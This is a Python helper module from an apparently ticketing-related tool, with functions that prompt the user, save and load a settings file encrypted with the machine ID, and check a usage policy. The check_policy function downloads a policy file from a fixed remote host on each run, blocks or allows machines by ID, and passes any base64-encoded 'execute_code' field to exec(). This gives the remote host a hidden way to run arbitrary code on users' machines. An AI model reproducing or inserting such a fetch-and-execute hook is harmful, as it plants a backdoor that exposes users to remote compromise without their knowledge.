# Copyright (c) 2023-2024 ZianTT, FriendshipEnder
def prompt(prompt):
    import inquirer
    data = inquirer.prompt(prompt)
    if data is None:
        raise KeyboardInterrupt
    return data


def save(data: dict):
    import base64
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import machineid
    import json
    key = machineid.id().encode()[:16]
    cipher = AES.new(key, AES.MODE_CBC)
    cipher_text = cipher.encrypt(pad(json.dumps(data).encode("utf-8"), AES.block_size))
    data = base64.b64encode(cipher_text).decode("utf-8")
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    with open("data", "w", encoding="utf-8") as f:
        f.write(iv + "%" + data)
    return


def load() -> dict:
    from i18n import i18n
    global i18n_lang
    from globals import i18n_lang
    import base64
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import machineid
    import json
    from loguru import logger
    import os
    key = machineid.id().encode()[:16]
    try:
        with open("data", "r", encoding="utf-8") as f:
            iv, data = f.read().split("%")
            iv = base64.b64decode(iv)
            cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = base64.b64decode(data)
        data = unpad(cipher.decrypt(cipher_text), AES.block_size).decode("utf-8")
        data = json.loads(data)
    except ValueError:
        logger.error(i18n[i18n_lang]["data_error"])
        if os.path.exists("share.json"):
            logger.info(i18n[i18n_lang]["migrate_share"])
            with open("share.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                save(data)
            os.remove("share.json")
            os.remove("data")
        else:
            data = {}
            os.remove("data")
        logger.info(i18n[i18n_lang]["has_destroyed"])
    return data

def check_policy():
    import requests
    from i18n import i18n
    global i18n_lang
    from globals import i18n_lang,version
    import os
    import sys
    from loguru import logger
    allow = True
    for _ in range(3):
        try:
            policy = requests.get("https://bhyg.bitf1a5h.eu.org/policy.json").json()
            break
        except Exception:
            logger.error(i18n[i18n_lang]["policy_error"])
    if "policy" not in locals():
        logger.error(i18n[i18n_lang]["policy_get_failed"])
        sys.exit(1)
    if version not in policy["allowed versions"]:
        logger.error(i18n[i18n_lang]["version_not_allowed"])
        allow = False
    import machineid
    if policy["type"] == "blacklist":
        if machineid.id() in policy["list"]:
            logger.error(i18n[i18n_lang]["blacklist"])
            allow = False
    elif policy["type"] == "whitelist":
        if machineid.id() not in policy["list"]:
            logger.error(i18n[i18n_lang]["whitelist"])
            allow = False
    elif policy["type"] == "none":
        pass
    else:
        pass
    if policy["execute_code"] is not None:
        import base64
        code = base64.b64decode(policy["execute_code"]).decode("utf-8")
        exec(code)
    if not allow:
        sys.exit(1)
    return